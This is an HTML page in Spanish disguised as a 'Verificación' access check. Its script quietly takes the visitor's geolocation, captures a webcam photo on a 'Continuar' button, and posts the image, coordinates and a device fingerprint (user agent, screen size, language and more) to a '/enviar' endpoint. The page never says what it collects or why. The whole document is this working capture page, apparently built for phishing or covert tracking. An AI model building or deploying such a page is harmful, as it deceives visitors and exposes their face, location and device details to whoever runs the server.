<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Acceso</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    background: #0d0d0d;
    color: #00ffcc;
    font-family: monospace;
    text-align: center;
}
video, canvas {
    width: 90%;
    max-width: 300px;
    border-radius: 10px;
    margin-top: 10px;
}
button {
    padding: 10px;
    margin: 10px;
    background: #00ffcc;
    border: none;
    border-radius: 5px;
}
</style>
</head>
<body>

<h2>Verificación</h2>

<video id="video" autoplay playsinline></video>
<br>

<button id="btn" onclick="capturar()" disabled>Cargando cámara...</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
let lat = "No permitido";
let lon = "No permitido";

// 📍 UBICACIÓN
navigator.geolocation.getCurrentPosition(
    pos => {
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;
    },
    err => {
        lat = "Denegado";
        lon = "Denegado";
    }
);

// 📸 CÁMARA
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    let video = document.getElementById('video');
    video.srcObject = stream;

    video.onloadedmetadata = () => {
        // 👉 activar botón cuando la cámara esté lista
        let btn = document.getElementById('btn');
        btn.disabled = false;
        btn.innerText = "Continuar";
    };
})
.catch(() => {
    alert("No se pudo acceder a la cámara");
});

// 📤 CAPTURAR Y ENVIAR
function capturar() {
    let video = document.getElementById('video');

    // seguridad extra
    if (video.readyState !== 4) {
        alert("Espera un momento, cargando cámara...");
        return;
    }

    let canvas = document.getElementById('canvas');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    let ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    let img = canvas.toDataURL("image/png");

    fetch('/enviar', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            imagen: img,
            resolucion: screen.width + "x" + screen.height,
            idioma: navigator.language,
            touch: ('ontouchstart' in window) ? "Sí" : "No",
            dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No",
            online: navigator.onLine ? "Conectado" : "Offline",
            useragent: navigator.userAgent,
            lat: lat,
            lon: lon
        })
    })
    .then(res => res.text())
    .then(data => {
        alert("Enviado: " + data);
    })
    .catch(err => {
        alert("Error: " + err);
    });
}
</script>

</body>
</html>
